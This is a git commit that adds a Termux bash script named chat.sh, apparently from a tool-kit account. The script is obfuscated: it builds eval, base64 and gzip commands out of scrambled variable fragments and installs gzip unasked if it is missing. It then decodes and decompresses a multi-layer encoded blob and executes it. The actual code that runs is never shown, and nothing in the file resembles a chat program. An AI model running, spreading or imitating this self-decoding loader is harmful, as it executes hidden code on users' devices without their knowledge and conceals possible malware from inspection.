858ab9c0a42ff3f7aacb9ca09b4502982dbe4b70
termux-tool-kit <68184618+termux-tool-kit@users.noreply.github.com>
2021-07-18 11:18:07 +0800

    Add files via upload

---
+++ chat.sh
@@ -0,0 +1,17 @@
+#!/bin/bash
+z="
+";Cz='Zzzz';hz=']]; ';Nz=''\''ech';gz=' '\'''\'' ';iz='then';Dz='ZZzz';Xz=''\''';Gz='zzz=';Tz='e64'\''';lz='zzZZ';Jz='zZzZ';Bz='ZZZZ';Wz=''\'' -d';Oz='o'\''';Qz=''\''eva';Hz=''\''gzi';az='$zzz';Sz=''\''bas';oz='fi';Pz='zzZz';Iz='p'\''';jz='pkg ';fz='Zz =';kz='i $z';Fz='ZZZz';Kz='zZzz';dz='if [';Vz='Zzz=';Yz='$(wh';Ez='zzzz';Mz='zZz=';nz='y';Rz='l'\''';Lz='ZzzZ';ez='[ $z';Az='zzzZ';cz=')';bz='zZZZ';mz='zz -';Zz='ich ';Uz='zZZz';eval "$Az$Bz$Cz$Dz$Ez$Fz$Ez$Ez$Dz$Gz$Hz$Iz$z$Az$Az$Cz$Jz$Kz$Kz$Lz$Ez$Cz$Mz$Nz$Oz$z$Az$Jz$Kz$Pz$Jz$Az$Jz$Kz$Pz$Gz$Qz$Rz$z$Pz$Pz$Ez$Cz$Ez$Kz$Az$Ez$Kz$Gz$Sz$Tz$z$Pz$Kz$Az$Ez$Az$Az$Az$Uz$Az$Vz$Wz$Xz$z$Kz$Pz$Dz$Kz$Az$Az$Kz$Az$Ez$Mz$Yz$Zz$az$Bz$Dz$Uz$Ez$bz$Ez$Ez$Uz$Ez$cz$z$dz$ez$Cz$Jz$Cz$Cz$Pz$Pz$Cz$Pz$Ez$fz$gz$hz$iz$z$jz$kz$lz$Bz$Az$Cz$Az$Dz$Ez$Az$Cz$mz$nz$z$oz";zZzzzzzzzzZZZZZZZzzzzzzzzZZzzzZzzzZZzzz=$($zzzZzzzZZzzzzZzZzZzzzZzzZzzZzzzzZzzzzZz "H4sIAAAAAAAAAwEZA+b8H4sIAAAAAAAAAwECA/38H4sIAAAAAAAAAwHrAhT9H4sIAAAAAAAAA5Pv
+5mAAA2bG/UwOf+UR3BVM4cjciUx5SNzWkOz8ywYif9/FF3YuM1RLMn+7a6VriNTabxMqfJIaBH4/
+sjLvvqqyLSd9qfCj7cnbfb0qSgJTju/8/uPO8Y1fH8k5hF37uIghcDbTI1HBOwf93TRXr018wTK7
+ePZlAwnGyf9n/WpZcELU5bWh247udx+iP2Vd0H+4ehXvHY+HWc3fVGumaWrZ31+k+fp9gSL3lgOr
+t/w04sifGpHwq2dCWf9rnRxm7zjLCXzPYnTKjvW/uLjd8lDIUo78DQHeBVxm3xxvGviGRlbJcesG
+fK5mCT3IKm4RnnXRSSqNv269TF/5hJmr5ln/CDEtDWZbxlrEbPzOwkL+yLTebNme5/fSRbk2nMzT
+/FvV19AW7ZNY43LC6kWhd624qa3GKtaNrIvaGB+qVtg9Vij3u22YrHp2m2PwQq9tir2zRR4vMZdQ
++/vvZkGB0Rt1ZoW5+74weW9ZPrc69UL7SbknYewpM3+3JPocsF/ZlNCawqRzlP1ZS9rJDIfJl1va
+Kk2SDt+7qdF474lBY53Eth1cf4uYV71a9ILN9+KMafm+FwwPKt78ZX715M5kqd5ap6fVCvX/7oU7
+K3193bz468FJTeGW9VOsTF6zaoqvNGGccd/6auzGFw6vOlIuec+6GVIwedOzNwYdd72UUwTC97gs
+0Ft/OrkjWOdCorjx7Lj91YfiMzrO3lfJXl95NDXxZmH5/nUrhQ1ff+sUWB9WIRL52LX201lzgU07
+8x5FiXctLxRb8ml38uKi9IpUY5Mr37+162vPm5ej9e582/2n923VlWROrNVbFPZzN/fLY7d1D4nr
+yS41uWXa0HZ9QdiRKfvMImf/rZwqpRocZLdlv9O/4xccN7btikkxCr4ntvb9Pkk7j0YF3ZiPBRsP
+1rCGT98ur+RUx8h7ZHN7CysDw85fMyUmMjEwbH95c/oKIB24NWTdfiANAE8WTA7WAgAADsURYOsC
+AAB5nUlrAgMAAN7D9vcZAwAA"|$zzZzzzZzzzzzZzzzzzzzzZzzzzzZzzzzzZzzzzz$zzZzzZzzzzzZzzzzzzzZzzzZzzzZzZZzzzzZZzz|$zzzZZZZZZzzzZZzzzzzzZZZzzzzzzzzzZZzzzzz$zzZzzZzzzzzZzzzzzzzZzzzZzzzZzZZzzzzZZzz|$zzzZZZZZZzzzZZzzzzzzZZZzzzzzzzzzZZzzzzz$zzZzzZzzzzzZzzzzzzzZzzzZzzzZzZZzzzzZZzz|$zzzZZZZZZzzzZZzzzzzzZZZzzzzzzzzzZZzzzzz$zzZzzZzzzzzZzzzzzzzZzzzZzzzZzZZzzzzZZzz|$zzzZZZZZZzzzZZzzzzzzZZZzzzzzzzzzZZzzzzz$zzZzzZzzzzzZzzzzzzzZzzzZzzzZzZZzzzzZZzz|$zzzZZZZZZzzzZZzzzzzzZZZzzzzzzzzzZZzzzzz$zzZzzZzzzzzZzzzzzzzZzzzZzzzZzZZzzzzZZzz|$zzzZZZZZZzzzZZzzzzzzZZZzzzzzzzzzZZzzzzz$zzZzzZzzzzzZzzzzzzzZzzzZzzzZzZZzzzzZZzz|$zzzZZZZZZzzzZZzzzzzzZZZzzzzzzzzzZZzzzzz$zzZzzZzzzzzZzzzzzzzZzzzZzzzZzZZzzzzZZzz|$zzzZZZZZZzzzZZzzzzzzZZZzzzzzzzzzZZzzzzz$zzZzzZzzzzzZzzzzzzzZzzzZzzzZzZZzzzzZZzz);$zzzZzZzZzZzzzzZzzZzZzzzZzZzZzZzzzzZzzzz "$zZzzzzzzzzZZZZZZZzzzzzzzzZZzzzZzzzZZzzz"
